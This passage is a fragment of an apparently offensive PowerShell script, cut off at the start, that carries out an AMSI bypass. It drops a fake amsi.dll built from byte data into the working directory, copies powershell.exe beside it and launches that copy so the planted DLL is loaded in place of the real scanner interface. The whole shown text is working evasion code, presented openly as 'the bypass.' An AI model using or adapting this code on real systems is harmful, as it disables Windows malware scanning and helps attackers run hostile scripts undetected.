[Byte[]] $temp = $DllBytes -split ' '                
Write-Output "Executing the bypass."
Write-Verbose "Dropping the fake amsi.dll to disk."
[System.IO.File]::WriteAllBytes("$pwd\amsi.dll", $temp)

Write-Verbose "Copying powershell.exe to the current working directory."
Copy-Item -Path C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Destination $pwd

Write-Verbose "Starting powershell.exe from the current working directory."
& "$pwd\powershell.exe"
